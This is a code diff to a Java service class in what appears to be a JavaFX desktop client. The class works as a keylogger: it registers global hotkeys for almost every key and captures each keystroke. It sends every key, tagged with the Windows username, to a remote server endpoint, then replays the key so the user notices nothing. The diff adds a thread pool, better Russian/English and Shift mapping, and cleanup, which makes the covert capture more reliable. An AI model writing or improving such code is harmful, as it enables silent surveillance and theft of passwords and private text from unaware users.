@@ -3,10 +3,13 @@ package ru.kolaer.client.javafx.services;
 import java.awt.event.KeyEvent;
 import java.nio.charset.Charset;
 import java.util.concurrent.CompletableFuture;
-
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.http.converter.StringHttpMessageConverter;
+import org.springframework.web.client.RestClientException;
 import org.springframework.web.client.RestTemplate;
 
 import ru.kolaer.client.javafx.tools.Resources;
@@ -18,9 +21,9 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	
 	private final RestTemplate restTemplate = new RestTemplate();
 	private final String username = System.getProperty("user.name");
+	private final ExecutorService keysThreadPool = Executors.newFixedThreadPool(25);
 	
 	private boolean isCapsLock = false;
-	private boolean isRus = false;
 	private int id;
 	
 	private boolean isRun = false;
@@ -48,11 +51,12 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	}
 
 	@Override
-	public void run() {
+	public void run() {	
 		CompletableFuture.runAsync(() -> {
+			Thread.currentThread().setName("Регистрация клавиш");
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
-				if(id>40) {
+				if(i>40) {
 					User32.RegisterHotKey(null, i + 1000, 0x0001, i);
 					User32.RegisterHotKey(null, i + 2000, 0x0002, i);
 					User32.RegisterHotKey(null, i + 3000, 0x0004, i);
@@ -73,11 +77,22 @@ public class UserWindowsKeyListenerService implements LocaleService {
 
 			while(this.isRun){
 				while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
+					if(!this.isRun) {
+						for(int i = 8; i <= 222; i++){
+							User32.UnregisterHotKey(null, i);
+							if(i>40) {
+								User32.UnregisterHotKey(null, i + 1000);
+								User32.UnregisterHotKey(null, i + 2000);
+								User32.UnregisterHotKey(null, i + 3000);
+								User32.UnregisterHotKey(null, i + 4000);
+							}
+						}
+						
+						break;
+					}
+					
 					if(msg.message == User32.WM_HOTKEY){
-						
-						if(!this.isRun)
-							break;
-						
+					
 						this.id = msg.wParam.intValue();
 
 						if(this.id > 4000)
@@ -97,32 +112,32 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						
 						final int idTemp = this.id;
 						final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
+						final int shiftKey = User32.GetKeyState(16);
 						
-						CompletableFuture.runAsync(() -> {	
-							Thread.currentThread().setName("Отправление клавиши на сервер");
-							
-							boolean isRusTemp = isRus;
+						CompletableFuture.runAsync(() -> {
+							Thread.currentThread().setName("Отправление клавиши на сервер!");
 							
 							if(idTemp == 20)
 								this.isCapsLock = !this.isCapsLock;
 
-							String key = isRusTemp ? getRusKey(idTemp) : getEngKey(idTemp);
+							String key = isRus ? getRusKey(idTemp) : getEngKey(idTemp);
 						
-							if(User32.GetKeyState(16) < 0){
-								key = this.getShiftKey(idTemp, key);
+							if(shiftKey < 0){
+								key = this.getShiftKey(idTemp, key, isRus);
 							}else if(this.isCapsLock){
 								if(65 <= idTemp && idTemp <= 90){
 									key = key.toUpperCase();
 								}
 							}
-							LOG.info("ID: {} - ({})", idTemp, key);
-							
-							this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
-							
-						}).exceptionally(t -> {	
-							LOG.error("Невозможно отправить сообщение на {}!", Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key");
-							return null;
-						});
+
+							try {
+								this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
+							} catch (RestClientException ex) {
+								LOG.error("Невозможно отправить сообщение на {}!", Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key");
+								LOG.info("ID: {} - ({})", idTemp, key);
+							}
+
+						}, keysThreadPool);
 						
 						User32.keybd_event(this.id, 0, 0, 0);;
 
@@ -160,16 +175,24 @@ public class UserWindowsKeyListenerService implements LocaleService {
 		}).exceptionally(t -> {
 			LOG.error("Ошибка!", t);
 			return null;
-		});
+		});		
 	}
 
 	@Override
 	public void stop() {
 		this.isRun = false;
+		
+		this.keysThreadPool.shutdown();
+		try {
+			this.keysThreadPool.awaitTermination(1, TimeUnit.MINUTES);
+		} catch (InterruptedException e) {
+			LOG.error("Привышен лимин ожидания завершения потоков!");
+		} finally {
+			this.keysThreadPool.shutdownNow();
+		}
 	}
 
-	private String getShiftKey(int code, final String key) {
-		
+	private String getShiftKey(int code, final String key, final boolean isRus) {		
 		if(65 <= code && code <= 90){
 			return this.isCapsLock ? key.toLowerCase() : key.toUpperCase();
 		}else{
@@ -185,11 +208,16 @@ public class UserWindowsKeyListenerService implements LocaleService {
 				case 56: return "*";
 				case 57: return "(";
 				case 219: return isRus ? key.toUpperCase() : "{";
-				case 221: return "}";
+				case 220: return isRus ? "/" : "|";
+				case 221: return isRus ? key.toUpperCase() : "}";
 				case 187: return "+";
+				case 188: return isRus ? key.toUpperCase() : "<";
 				case 189: return "_";
-				case 192: return isRus ? key.toUpperCase() : "`";
-				default: return key;
+				case 190: return isRus ? key.toUpperCase() : ">";
+				case 191: return isRus ? "," : "?";
+				case 192: return isRus ? key.toUpperCase() : "~";
+				case 222: return isRus ? key.toUpperCase() : "\"";
+				default: return key.toUpperCase();
 			}
 		}
 	}
@@ -225,6 +253,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			case 186: return "ж";
 			case 188: return "б";
 			case 190: return "ю";
+			case 191: return ".";
 			case 192: return "ё";
 			case 219: return "х";
 			case 221: return "ъ";
@@ -331,7 +360,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			case 189: return "-";
 			case 190: return ".";
 			case 191: return "/";
-			case 192: return "~";
+			case 192: return "`";
 			case 219: return "[";
 			case 220: return "\\";
 			case 221: return "]";
